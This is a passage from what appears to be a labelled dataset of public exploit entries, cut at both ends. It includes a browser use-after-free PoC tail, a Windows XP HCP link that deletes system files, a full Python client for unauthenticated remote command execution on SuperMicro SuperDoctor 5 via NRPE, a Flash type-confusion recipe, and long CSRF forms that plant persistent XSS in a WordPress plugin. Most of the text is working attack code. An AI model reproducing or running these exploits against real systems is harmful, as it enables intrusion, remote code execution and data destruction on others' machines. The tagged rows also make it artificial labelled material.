document.body.appendChild(document.createElement('input')); input.focus(); handler = event => {   shadow_root = event.target.parentNode.parentNode.parentNode;   input.type = 'range';   elt = shadow_root.firstChild.firstChild.firstChild;   input.remove();   elt.remove();   evt = new MouseEvent('mouseup');   div = document.createElement('div');   new_shadow_root = div.attachShadow({mode: 'open'});   new_shadow_root.appendChild(elt);   elt.dispatchEvent(evt); } document.execCommand('insertHTML', false, '<iframe src=""about:blank"" onload=""handler(event)""></iframe>'); </script> </body>   <!-- CREDIT INFORMATION Sergei Glazunov of Google Project Zero -->",following the ancestor chain from the <iframe>,1
21717,"Microsoft Windows XP - HCP URI Handler Abuse source: https://www.securityfocus.com/bid/5478/info  Microsoft Internet Explorer on Windows XP comes equipped with a protocol handler for the 'Help and Support Center' application. The protocol handler may be specified in links, and when such a link is submitted by the browser, the Help and Control Center will load an appropriate page. However, it has been demonstrated that this behavior may be abused.  The browser runs requests to the HCP URI handler with relaxed Security Zone restrictions. One of the Help and Support Center application files (uplddrvinfo.htm) contains an ActiveX control which may be used to delete local files. Since the ActiveX control accepts filenames from the HCP URIs, it is possible for an attacker to abuse this situation via a malicious link. Because the browser runs the HCP request with relaxed restrictions, the user is not prompted when the ActiveX control is executed. However, it has been reported that a window with a ""Get Help With Your Hardware Device"" dialog is displayed when uplddrvinfo.htm is invoked, and that the utility will follow through with the commands if the user closes this window.  A number of other files are included in the Help and Support Center application which may also be used by a remote attacker to perform various actions on the client system via a maliciously constructed HCP URI.  By using the 'hcp:' protocol, it's possible to launch this from a link. The filename can also include wild cards. Thus, the following link will delete all files in the 'C:\windows\' directory when the launched window is closed. (normal file permissions still apply as usual). Sub-directories are not deleted.  hcp://system/DFS/uplddrvinfo.htm?file://c:\windows\*",a malicious link,1
47030,"SuperDoctor5 - 'NRPE' Remote Code Execution # SuperMicro implemented a Remote Command Execution plugin in their implementation of  # NRPE in SuperDocter 5, which is their monitoring utility for SuperMicro chassis'. # This is an intended feature but leaves the system open (by default) to unauthenticated # remote command execution by abusing the 'executable' plugin with an NRPE client. #  # For your pleasure, here is a PoC Python NRPE Client that will connect, execute the  # cmd of choice and return its output. # # To mitigate this vulnerbility, edit your agent.cfg to specificy which IPs are allowed  # to execute NRPE commands agaist the system and/or block traffic on port 5666. # # NRPE cannot be disabled in this software, see Guide section 3.2   #Author: Simon Gurney  #Date: 23/05/2019 #Vendor: SuperMicro #Product: SuperMicro Super Doctor 5 #Version: 5 #Guide: ftp://supermicro.com/ISO_Extracted/CDR-C9_V1.00_for_Intel_C9_platform/SuperDoctor_V/Linux/SuperDoctor5_UserGuide.pdf    ### Configurables  command = ""ping 1.1.1.1 -n 1"" target = ""1.2.3.4"" target_port = 5666  ### Don't need to change anything below  import binascii import struct import socket import ssl  #### Struct Encoding Types StructCodeInt16 = ""!h"" ## Unsigned Int16 StructCodeInt32 = ""!L"" ## Unsigned Int32  #### NRPE Specific definitions NRPE_Version = ("""",""One"", ""Two"", ""Three"") NRPE_Packet_Type = ("""", ""Query"", ""Response"") NRPE_Response = (""Ok"", ""Warning"", ""Critical"", ""Unknown"") NRPE_Version_1 = 1 NRPE_Version_2 = 2 NRPE_Version_3 = 3 NRPE_Packet_Type_Query = 1 NRPE_Packet_Type_Response = 2 NRPE_Response_Ok = 0 NRPE_Response_Warning = 1 NRPE_Response_Critical = 2 NRPE_Response_Unknown = 3 NRPE_Response_Type_Query = 3  #### RandomDefintions NullByte = b""\x00"" TwoCharSuffix = ""SG""  class NRPEpacket: 	port = 5666 	server = ""127.0.0.1"" 	nrpeVersion = NRPE_Version_2 	nrpePacketType = NRPE_Packet_Type_Query 	nrpeResponseCode = NRPE_Response_Type_Query 	ownSocket = None 	def CalculateCRC(self): 		tempBuffer = struct.pack(StructCodeInt16,self.nrpeVersion) 		tempBuffer += struct.pack(StructCodeInt16,self.nrpePacketType) 		tempBuffer += NullByte * 4 		tempBuffer += struct.pack(StructCodeInt16,self.nrpeResponseCode) 		tempBuffer += self.content 		return (struct.pack(StructCodeInt32, binascii.crc32(tempBuffer) & 0xffffffff)) 	def PadTo1024Bytes(self,command): 		if len(command) <= 1024: 			tempBuffer = command 		else: 			Error(""Command string is too long!"") 		while len(tempBuffer) < 1024: 			tempBuffer += ""\x00"" 		tempBuffer += TwoCharSuffix 		return tempBuffer.encode() 	def Connect(self): 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		self.socket.connect((self.server,self.port)) 	def WrapSSL(self): 		self.socket = ssl.wrap_socket(self.socket,cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23, ciphers=""ALL"") 	def Send(self): 		tempBuffer = struct.pack(StructCodeInt16,self.nrpeVersion) 		tempBuffer += struct.pack(StructCodeInt16,self.nrpePacketType) 		tempBuffer += self.crc 		tempBuffer += struct.pack(StructCodeInt16,self.nrpeResponseCode) 		tempBuffer += self.content 		self.socket.send(tempBuffer) 	def Recv(self): 		tempBuffer = self.socket.recv(2048) 		self.nrpeVersion = struct.unpack(StructCodeInt16,tempBuffer[0:2])[0] 		self.nrpePacketType = struct.unpack(StructCodeInt16,tempBuffer[2:4])[0] 		self.crc = tempBuffer[4:8] 		self.nrpeResponseCode = struct.unpack(StructCodeInt16,tempBuffer[8:10])[0] 		self.content = tempBuffer[10:] 		if self.crc != self.CalculateCRC(): 			print (""CRC does not match!"") 	def PrintOut(self): 		print("" -=-=-=-= Begin NRPE Content =-=-=-=-"") 		print(""| NRPE Version       =  %i  -  %s"" % (self.nrpeVersion,NRPE_Version[self.nrpeVersion])) 		print(""| NRPE Packet Type   =  %i  -  %s"" % (self.nrpePacketType,NRPE_Packet_Type[self.nrpePacketType])) 		print(""| NRPE Packet CRC    =  %i"" % struct.unpack(StructCodeInt32,self.crc)[0]) 		print(""| NRPE Response Code =  %i  -  %s"" % (self.nrpeResponseCode,NRPE_Response[self.nrpeResponseCode])) 		print(""| Packet Content:"") 		print(""| %s"" % self.content.decode().strip(TwoCharSuffix).strip(""\x00"")) 		print("" -=-=-=-= End NRPE Content =-=-=-=-"") 	def Close(self): 		if not self.ownSocket: 			self.socket.close() 	def AutoSend(self): 		print(""Sending..."") 		self.PrintOut() 		self.Send() 		print(""Receiving..."") 		self.Recv() 		self.PrintOut() 		self.Close() 	def __init__(self, command, socket=None, server=None, port = None, ssl=True): 		self.content = self.PadTo1024Bytes(command) 		self.crc = self.CalculateCRC() 		if server: 			self.server = server 		if port: 			self.port = port 		if not socket: 			self.Connect() 		else: 			self.socket = socket 			self.ownSocket = True 		if ssl == True: 			self.WrapSSL()  			 #NRPE CMD format is ""executable!<binary>!<arguments> i.e."" #NRPEpacket(""executable!ping!1.1.1.1 -n 1"", server=""1.2.3.4"").AutoSend()  split = command.split("" "",1) cmd = ""executable!"" + split[0] + ""!"" + split[1] NRPEpacket(cmd, server=target, port=target_port).AutoSend()",abusing the 'executable' plugin with an NRPE client,1
39476,"Adobe Flash - SimpleButton Creation Type Confusion Source: https://code.google.com/p/google-security-research/issues/detail?id=640  There is a type confusion vulnerability in the SimpleButton constructor. Flash stores an empty button to use to create buttons for optimization reasons. If this object is created using a SWF tag before it is created in the Button class, and it not of type Button, type confusion can occur.  A SWF needs to be altered in a hex editor to reproduce this issue. To start, build button.fla. This is a swf with the code:  var sb = new SimpleButton();  and a font attached. Decompress the swf using flasm -x button.swf, and then replace all occurrences of the font ID (0x0001) in the three tags that use it with the ID of the empty button object (0xfff6).    When the button is created, the font will be type confused with a button.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39476.zip",a specially crafted .fla file,1
38086,"WordPress Plugin Contact Form Generator 2.0.1 - Multiple Cross-Site Request Forgery Vulnerabilities ﻿<html>   <!--   # Exploit Title: WordPress Contact Form Generator v2.0.1 and below (create/update field for contact form) CSRF and Persistent issue   # Date: 2015-09-04   # Google Dork: Index of /wp-content/plugins/contact-form-generator/   # Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]   # Vendor Homepage: http://creative-solutions.net/   # plugin uri: http://creative-solutions.net/wordpress/contact-form-generator/   # Software Link: https://downloads.wordpress.org/plugin/contact-form-generator.zip   # Version: 2.0.1   # Tested on: windows 10 + firefox.     ======================     Description (plugin)   ======================   Contact Form Generator is a powerful contact form builder for WordPress! See <a href=""http://creative-solutions.net/wordpress/contact-   form-generator/demo"">Live Demos</a>. It is packed with a <a href=""http://creative-solutions.net/wordpress/contact-form-generator/   template-creator-demo"">Template Creator Wizard</a> to create fantastic forms in a matter of seconds without coding.   (copy of ´contactformgenerator.php´ file)   ===================    TECHNICAL DETAILS   ===================   A CSRF issue was found in the latest version of the plugin for wordpress 'Contact Form Generator'.   The issue can be exploited by sending a special link to a wordpress administrator having installed the vulnerable plugin.    form field creation: when the victim accesses the sent link, will create a new form and inject HTML / JS code   without knowing.    Update form field: when the victim accesses the link, will update information of the form identified for ´id´   parameter by injecting HTML / JS code.    -->   <!--   ================================    Field form creation [CSRF PoC]   ================================   -->   <body>     <form action=""http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=fields"" method=""POST"">       <input type=""hidden"" name=""name"" value="">""<img&#32;src&#61;x>"" />       <input type=""hidden"" name=""id&#95;form"" value=""8"" /> <!-- an existing form id value for this element -->       <input type=""hidden"" name=""id&#95;type"" value=""1"" />       <input type=""hidden"" name=""task"" value=""save"" />       <input type=""hidden"" name=""id"" value=""0"" />       <input type=""submit"" value=""Click me for create a field"" />     </form>   </body>  <!--   ================================    Field form update [CSRF PoC]   ================================   -->   <body>     <form action=""http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=fields"" method=""POST"">       <input type=""hidden"" name=""name"" value=""s""&#32;onmouseover&#61;""alert&#40;&#47;i0&#45;sec&#47;&#41;""&#32;a&#61;"" />       <input type=""hidden"" name=""tooltip&#95;text"" value=""s""&#32;onmouseover&#61;""alert&#40;&#47;i0&#45;sec&#47;&#41;""&#32;a&#61;"" />              <input type=""hidden"" name=""id&#95;form"" value=""3"" /> <!-- an existing form id value -->              <input type=""hidden"" name=""id&#95;type"" value=""1"" />       <input type=""hidden"" name=""column&#95;type"" value=""0"" />       <input type=""hidden"" name=""required"" value=""0"" />       <input type=""hidden"" name=""published"" value=""1"" />       <input type=""hidden"" name=""width"" value=""s""&#32;onmouseover&#61;""alert&#40;&#47;i0&#45;sec&#47;&#41;""&#32;a&#61;"" />       <input type=""hidden"" name=""field&#95;margin&#95;top"" value=""s""&#32;onmouseover&#61;""alert&#40;&#47;i0&#45;sec&#47;&#41;""&#32;a&#61;"" />       <input type=""hidden"" name=""task"" value=""save"" />        <input type=""hidden"" name=""id"" value=""7"" />  <!-- field id to edit -->        <input type=""submit"" value=""Click me for update a field"" />     </form>   </body> </html> <!--   2015-09-02: vulnerability found   2015-09-04: Reported to vendor   2015-09-04: Full disclosure   -->  <html>   <!--   # Exploit Title: WordPress Contact Form Generator v2.0.1 and below (create/update form) CSRF and Persistent issue   # Date: 2015-09-04   # Google Dork: Index of /wp-content/plugins/contact-form-generator/   # Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]   # Vendor Homepage: http://creative-solutions.net/   # plugin uri: http://creative-solutions.net/wordpress/contact-form-generator/   # Software Link: https://downloads.wordpress.org/plugin/contact-form-generator.zip   # Version: 2.0.1   # Tested on: windows 10 + firefox.     ======================     Description (plugin)   ======================   Contact Form Generator is a powerful contact form builder for WordPress! See <a href=""http://creative-solutions.net/wordpress/contact-   form-generator/demo"">Live Demos</a>. It is packed with a <a href=""http://creative-solutions.net/wordpress/contact-form-generator/   template-creator-demo"">Template Creator Wizard</a> to create fantastic forms in a matter of seconds without coding.   (copy of ´contactformgenerator.php´ file)   ===================    TECHNICAL DETAILS   ===================   A CSRF issue was found in the latest version of the plugin for wordpress 'Contact Form Generator'.   The issue can be exploited by sending a special link to a wordpress administrator having installed the vulnerable plugin.    template creation: when the victim accesses the sent link, will create a new form and inject HTML / JS code   without knowing.    Update form: when the victim accesses the link, will update information of the form identified for ´id´   parameter by injecting HTML / JS code.   -->    <!--    =========================    Create form [CSRF PoC ]   =========================   payload: ""><img src=[x]><   -->    <body>     <form action=""http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=forms"" method=""POST"">       <input type=""hidden"" name=""name"" value=""dsSASA&quot;&gt;&lt;img&#32;src&#61;1&gt;&lt;"" />       <input type=""hidden"" name=""top&#95;text"" value=""xds&quot;&gt;&lt;img&#32;src&#61;2&gt;&lt;"" />       <input type=""hidden"" name=""pre&#95;text"" value=""&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;3&gt;&lt;"" />       <input type=""hidden"" name=""thank&#95;you&#95;text"" value=""Message&#32;successfully&#32;sent&quot;&gt;&lt;img&#32;src&#61;4&gt;&lt;"" />       <input type=""hidden"" name=""send&#95;text"" value=""Send&quot;&gt;&lt;img&#32;src&#61;5&gt;&lt;"" />       <input type=""hidden"" name=""send&#95;new&#95;text"" value=""New&#32;email&quot;&gt;&lt;img&#32;src&#61;6&gt;&lt;"" />       <input type=""hidden"" name=""close&#95;alert&#95;text"" value=""Close&quot;&gt;&lt;img&#32;src&#61;7&gt;&lt;"" />       <input type=""hidden"" name=""form&#95;width"" value=""100&#37;&quot;&gt;&lt;img&#32;src&#61;8&gt;&lt;"" />       <input type=""hidden"" name=""id&#95;template"" value=""0"" />        <input type=""hidden"" name=""email&#95;to"" value=""&quot;&gt;&lt;img&#32;src&#61;9&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;bcc"" value=""&quot;&gt;&lt;img&#32;src&#61;10&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;subject"" value=""&quot;&gt;&lt;img&#32;src&#61;11&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;from"" value=""&quot;&gt;&lt;img&#32;src&#61;12&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;from&#95;name"" value=""&quot;&gt;&lt;img&#32;src&#61;13&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;replyto"" value=""&quot;&gt;&lt;img&#32;src&#61;14&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;replyto&#95;name"" value=""&quot;&gt;&lt;img&#32;src&#61;15&gt;&lt;"" />       <input type=""hidden"" name=""redirect"" value=""0"" />       <input type=""hidden"" name=""redirect&#95;itemid"" value=""2&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;"" />       <input type=""hidden"" name=""redirect&#95;url"" value=""&quot;&gt;&lt;img&#32;src&#61;16&gt;&lt;"" />       <input type=""hidden"" name=""redirect&#95;delay"" value=""0"" />       <input type=""hidden"" name=""send&#95;copy&#95;enable"" value=""1"" />       <input type=""hidden"" name=""send&#95;copy&#95;text"" value=""Send&#32;me&#32;a&#32;copy&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;"" />       <input type=""hidden"" name=""shake&#95;count"" value=""2"" />       <input type=""hidden"" name=""shake&#95;distanse"" value=""10"" />       <input type=""hidden"" name=""shake&#95;duration"" value=""300"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;referrer"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;ip"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;browser"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;os"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;sc&#95;res"" value=""1"" />       <input type=""hidden"" name=""show&#95;back"" value=""1"" />       <input type=""hidden"" name=""published"" value=""1"" />       <input type=""hidden"" name=""custom&#95;css"" value=""&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;21&gt;&lt;"" />       <input type=""hidden"" name=""task"" value=""save"" />       <input type=""hidden"" name=""id"" value=""0"" />        <input type=""submit"" value=""Click me for create a form"" />     </form>   </body>   <!--    ==========================     Update form [CSRF PoC ]   ==========================   payload: ""><img src=[x]><   -->   <body>     <form action=""http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=forms"" method=""POST"">       <input type=""hidden"" name=""name"" value=""dsSASA&quot;&gt;&lt;img&#32;src&#61;1&gt;&lt;"" />       <input type=""hidden"" name=""top&#95;text"" value=""xds&quot;&gt;&lt;img&#32;src&#61;2&gt;&lt;"" />       <input type=""hidden"" name=""pre&#95;text"" value=""&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;3&gt;&lt;"" />       <input type=""hidden"" name=""thank&#95;you&#95;text"" value=""Message&#32;successfully&#32;sent&quot;&gt;&lt;img&#32;src&#61;4&gt;&lt;"" />       <input type=""hidden"" name=""send&#95;text"" value=""Send&quot;&gt;&lt;img&#32;src&#61;5&gt;&lt;"" />       <input type=""hidden"" name=""send&#95;new&#95;text"" value=""New&#32;email&quot;&gt;&lt;img&#32;src&#61;6&gt;&lt;"" />       <input type=""hidden"" name=""close&#95;alert&#95;text"" value=""Close&quot;&gt;&lt;img&#32;src&#61;7&gt;&lt;"" />       <input type=""hidden"" name=""form&#95;width"" value=""100&#37;&quot;&gt;&lt;img&#32;src&#61;8&gt;&lt;"" />       <input type=""hidden"" name=""id&#95;template"" value=""0"" />        <input type=""hidden"" name=""email&#95;to"" value=""&quot;&gt;&lt;img&#32;src&#61;9&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;bcc"" value=""&quot;&gt;&lt;img&#32;src&#61;10&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;subject"" value=""&quot;&gt;&lt;img&#32;src&#61;11&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;from"" value=""&quot;&gt;&lt;img&#32;src&#61;12&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;from&#95;name"" value=""&quot;&gt;&lt;img&#32;src&#61;13&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;replyto"" value=""&quot;&gt;&lt;img&#32;src&#61;14&gt;&lt;"" />       <input type=""hidden"" name=""email&#95;replyto&#95;name"" value=""&quot;&gt;&lt;img&#32;src&#61;15&gt;&lt;"" />       <input type=""hidden"" name=""redirect"" value=""0"" />       <input type=""hidden"" name=""redirect&#95;itemid"" value=""2&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;"" />       <input type=""hidden"" name=""redirect&#95;url"" value=""&quot;&gt;&lt;img&#32;src&#61;16&gt;&lt;"" />       <input type=""hidden"" name=""redirect&#95;delay"" value=""0"" />       <input type=""hidden"" name=""send&#95;copy&#95;enable"" value=""1"" />       <input type=""hidden"" name=""send&#95;copy&#95;text"" value=""Send&#32;me&#32;a&#32;copy&quot;&gt;&lt;img&#32;src&#61;17&gt;&lt;"" />       <input type=""hidden"" name=""shake&#95;count"" value=""2"" />       <input type=""hidden"" name=""shake&#95;distanse"" value=""10"" />       <input type=""hidden"" name=""shake&#95;duration"" value=""300"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;referrer"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;ip"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;browser"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;os"" value=""1"" />       <input type=""hidden"" name=""email&#95;info&#95;show&#95;sc&#95;res"" value=""1"" />       <input type=""hidden"" name=""show&#95;back"" value=""1"" />       <input type=""hidden"" name=""published"" value=""1"" />       <input type=""hidden"" name=""custom&#95;css"" value=""&lt;&#47;textarea&gt;&quot;&gt;&lt;img&#32;src&#61;21&gt;&lt;"" />       <input type=""hidden"" name=""task"" value=""save"" />       <input type=""hidden"" name=""id"" value=""0"" />        <input type=""submit"" value=""Click me for edit form"" />     </form>   </body> </html> <!--   ===========    TIMELINE   ===========   2015-09-02: vulnerability found   2015-09-04: Reported to vendor   2015-09-04: Full disclosure -->  <html>   <!--   # Exploit Title: WordPress Contact Form Generator v2.0.1 and below (create/update template for contact form) CSRF and Persistent issue   # Date: 2015-09-04   # Google Dork: Index of /wp-content/plugins/contact-form-generator/   # Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]   # Vendor Homepage: http://creative-solutions.net/   # plugin uri: http://creative-solutions.net/wordpress/contact-form-generator/   # Software Link: https://downloads.wordpress.org/plugin/contact-form-generator.zip   # Version: 2.0.1   # Tested on: windows 10 + firefox.     ======================     Description (plugin)   ======================   Contact Form Generator is a powerful contact form builder for WordPress! See <a href=""http://creative-solutions.net/wordpress/contact-   form-generator/demo"">Live Demos</a>. It is packed with a <a href=""http://creative-solutions.net/wordpress/contact-form-generator/   template-creator-demo"">Template Creator Wizard</a> to create fantastic forms in a matter of seconds without coding.   (copy of ´contactformgenerator.php´ file)   ===================    TECHNICAL DETAILS   ===================   A CSRF issue was found in the latest version of the plugin for wordpress 'Contact Form Generator'.   The issue can be exploited by sending a special link to a wordpress administrator having installed the vulnerable plugin.    template creation: when the victim accesses the sent link, will create a new template and inject HTML / JS code   without knowing.    Update template: when the victim accesses the link, will update information of the template identified for ´id´   parameter by injecting HTML / JS code.    -->   <!--    ==============================   create a template [CSRF PoC ]   ==============================   payload: ""><img src=x>   -->   <body>     <form action=""http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=templates"" method=""POST"">       <input type=""hidden"" name=""name"" value=""xsa&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />  <!-- persistent form name [XSS] -->       <input type=""hidden"" name=""published"" value=""1"" />       <input type=""hidden"" name=""task"" value=""save"" />       <input type=""hidden"" name=""id"" value=""0"" />       <input type=""submit"" value=""Click me for add new template"" />     </form>   </body>   <!--    ==============================   edit a template [CSRF PoC ]   ==============================   payload: ""><img src=x>   -->   <body>     <form action=""http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms&act=cfg_submit_data&holder=templates"" method=""POST"">       <input type=""hidden"" name=""name"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;587&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;588&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;131&#93;"" value=""inherit"" />       <input type=""hidden"" name=""styles&#91;589&#93;"" value=""1"" />       <input type=""hidden"" name=""styles&#91;629&#93;"" value=""dark&#45;thin"" />       <input type=""hidden"" name=""styles&#91;630&#93;"" value=""dark&#45;thin"" />       <input type=""hidden"" name=""styles&#91;627&#93;"" value=""0"" />       <input type=""hidden"" name=""styles&#91;0&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;130&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;517&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;518&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;1&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;2&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;3&#93;"" value=""solid"" />       <input type=""hidden"" name=""styles&#91;4&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;5&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;6&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;7&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;8&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;9&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;10&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;11&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;12&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;13&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;14&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;15&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;16&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;17&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;18&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;19&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;600&#93;"" value=""0"" />       <input type=""hidden"" name=""styles&#91;601&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;602&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;603&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;604&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;605&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;606&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;607&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;608&#93;"" value=""solid"" />       <input type=""hidden"" name=""styles&#91;609&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;610&#93;"" value=""0"" />       <input type=""hidden"" name=""styles&#91;611&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;612&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;613&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;614&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;615&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;616&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;617&#93;"" value=""0"" />       <input type=""hidden"" name=""styles&#91;618&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;619&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;620&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;621&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;622&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;623&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;624&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;625&#93;"" value=""solid"" />       <input type=""hidden"" name=""styles&#91;626&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;20&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;21&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;22&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;23&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;24&#93;"" value=""none"" />       <input type=""hidden"" name=""styles&#91;25&#93;"" value=""left"" />       <input type=""hidden"" name=""styles&#91;506&#93;"" value=""inherit"" />       <input type=""hidden"" name=""styles&#91;510&#93;"" value=""cfg&#95;font&#95;effect&#95;none"" />       <input type=""hidden"" name=""styles&#91;27&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;28&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;29&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;30&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;190&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;191&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;192&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       